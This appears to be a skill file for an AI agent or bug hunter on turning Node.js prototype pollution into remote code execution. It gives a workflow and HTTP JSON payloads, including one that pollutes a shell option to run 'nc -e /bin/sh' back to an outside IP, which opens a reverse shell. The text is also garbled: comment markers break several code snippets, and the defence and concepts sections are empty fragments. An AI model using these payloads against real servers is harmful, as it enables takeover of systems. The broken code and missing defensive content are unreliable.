---
name: prototype-pollution-rce
description: >
  Identify and exploit Prototype Pollution vulnerabilities in JavaScript/Node.js applications. 
  This skill covers the progression from polluting `Object.prototype` to identifying functional 
  gadgets (like `child_process.spawn`) to achieve Remote Code Execution (RCE).
domain: cybersecurity
subdomain: bug-hunting
category: Web Vulnerabilities
difficulty: advanced
estimated_time: "3-5 hours"
mitre_attack:
  tactics: [TA0001, TA0004, TA0008]
  techniques: [T1190, T1059.007]
platforms: [web, nodejs]
tags: [prototype-pollution, javascript, nodejs, rce, bug-hunting, web-security]
tools: [burp-suite, custom-scripts, nodejs]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Prototype Pollution to RCE (Node.js)

## When to Use
- When auditing JavaScript (client-side) or Node.js (server-side) applications that perform deep merging, cloning, or path assignment on user-controlled JSON data.
- To escalate a seemingly minor logic flaw (modifying object properties) into full Remote Code Execution on the backend server.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Identifying the Pollution Vector (Sink)

```javascript
# Concept: Deep Merge const merge = (target, source) => {
    for (let attr in source) {
        if (typeof(target[attr]) === "object" && typeof(source[attr]) === "object") {
            merge(target[attr], source[attr]); // VULNERABLE } else {
            target[attr] = source[attr];
        }
    }
    return target;
};
```

### Phase 2: Testing for Pollution

```http
# POST /api/settings HTTP/1.1
Content-Type: application/json

{"__proto__": {"isAdmin": true}}

# ```

### Phase 3: Finding a Gadget (Path to RCE)

```javascript
# const { execSync } = require('child_process');

function executeCommand(opts) {
    // let shell = opts.shell || '/bin/sh'; 
    execSync('echo hello', { shell: shell });
}
```

### Phase 4: Exploitation (Polluting the Gadget)

```http
# POST /api/settings HTTP/1.1
Content-Type: application/json

{
  "__proto__": {
    "shell": "node -e 'require(\"child_process\").execSync(\"nc -e /bin/sh 10.10.10.10 4444\")'"
  }
}
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Test Prototype ] --> B{Pollution Verified ]}
    B -->|Yes| C[Find Gadgets ]
    B -->|No| D[Check Alternate ]
    C --> E[Exploit RCE ]
```


## 🔵 Blue Team Detection & Defense
- **Input Sanitization**: **Safe Merging Libraries**: **Object.freeze() / Object.create(null)**: Key Concepts
| Concept | Description |
|---------|-------------|
## Output Format
```
Prototype Pollution Rce — Assessment Report
============================================================
Target: [Target identifier]
Assessor: [Operator name]
Date: [Assessment date]
Scope: [Authorized scope]
MITRE ATT&CK: [Relevant technique IDs]

Findings Summary:
  [Finding 1]: [Severity] — [Brief description]
  [Finding 2]: [Severity] — [Brief description]

Detailed Results:
  Phase 1: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

  Phase 2: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

Risk Rating: [Critical/High/Medium/Low/Informational]
Recommendations:
  1. [Immediate remediation step]
  2. [Long-term hardening measure]
  3. [Monitoring/detection improvement]
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- PortSwigger: [Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
- Infosec Writeups: [NodeJS Prototype Pollution to RCE](https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2)
